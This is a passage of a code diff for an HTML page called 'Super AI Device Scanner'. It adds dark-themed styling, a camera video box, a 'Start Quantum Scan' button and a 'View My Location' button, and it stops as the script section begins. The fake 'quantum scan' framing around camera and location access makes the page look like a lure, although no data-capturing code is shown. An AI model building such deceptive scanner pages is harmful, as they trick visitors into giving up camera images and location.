@@ -1,12 +1,105 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <!-- Meta tags dan styles tetap sama -->
+  <meta charset="UTF-8">
+  <title>Super AI Device Scanner</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <style>
+    :root {
+      --primary: #2ecc71;
+      --secondary: #3498db;
+    }
+    body { 
+      font-family: 'Roboto', Arial, sans-serif; 
+      text-align: center; 
+      padding: 20px; 
+      background: #1a1a1a;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .scanner-box {
+      width: 300px;
+      height: 300px;
+      border: 4px solid var(--primary);
+      border-radius: 20px;
+      margin: 20px auto;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
+    }
+    .scanner-line {
+      position: absolute;
+      width: 100%;
+      height: 4px;
+      background: var(--primary);
+      animation: scan 3s infinite;
+      box-shadow: 0 0 10px var(--primary);
+    }
+    @keyframes scan {
+      0% { top: 0; opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { top: 100%; opacity: 0; }
+    }
+    button {
+      padding: 15px 40px;
+      font-size: 20px;
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: all 0.3s;
+      color: white;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin: 20px;
+      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+    }
+    #loading {
+      display: none;
+      font-size: 1.5em;
+      color: var(--primary);
+      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
+      margin: 10px;
+    }
+    .hologram-effect {
+      position: fixed;
+      pointer-events: none;
+      mix-blend-mode: screen;
+      opacity: 0.3;
+      z-index: 9999;
+    }
+    @keyframes hologram {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Gaya untuk informasi lokasi */
+    #location-info {
+      margin-top: 10px;
+      font-size: 1em;
+    }
+    #location-info a {
+      color: var(--secondary);
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-  <!-- HTML structure tetap sama -->
-
-  <script>
+  <h1 style="color: var(--primary); margin-bottom: 20px;">🛸 AI Device Scanner</h1>
+  <div class="scanner-box">
+    <div class="scanner-line"></div>
+    <video id="video" width="300" height="300" autoplay playsinline muted></video>
+  </div>
+  <button id="capture-btn">🚀 Start Quantum Scan</button>
+  <button id="location-btn">📍 View My Location</button>
+  <div id="location-info"></div>
+  <div id="loading">🔭 Scanning Quantum Signature...</div>
+<script>
     // === Konfigurasi yang sama ===
 
     // === Fungsi Lokasi yang Ditingkatkan ===
